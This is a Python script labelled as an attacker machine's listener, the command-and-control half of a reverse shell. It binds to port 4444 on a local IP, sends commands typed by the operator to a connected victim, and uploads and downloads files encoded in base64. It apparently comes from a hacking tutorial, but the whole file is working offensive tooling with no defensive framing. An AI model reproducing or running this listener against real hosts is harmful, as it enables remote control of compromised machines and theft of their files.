import socket,json,base64


# Kali - Attacker Machine



class Listener:
    
    def __init__(self,ip,port):
        listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        listener.bind((ip,port))
        listener.listen(0)
        print("[+] Waiting for incoming connection")
        self.connection,address = listener.accept()
        print("Got Connection from " + str(address))
        
    def box_send(self,data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def box_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + str(self.connection.recv(1024))
                return json.loads(json_data)
            except ValueError:
                continue
        
    def execute(self,command):
        self.box_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.box_receive()
    
    def write_file(self,file_name,content):
        with open(file_name,"wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download sucessfully"
        
    def read_file(self,file_name):
        with open(file_name,"rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = input(">> ")
            command  = command.split(" ")
            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)
                response = self.execute(command)
                if command[0] == "download":
                    response = self.write_file(command[1],response)
            except Exception:
                response = "[+] Error While Running the command"
            print(response)
            
listener1 = Listener("192.168.1.11",4444)
listener1.run()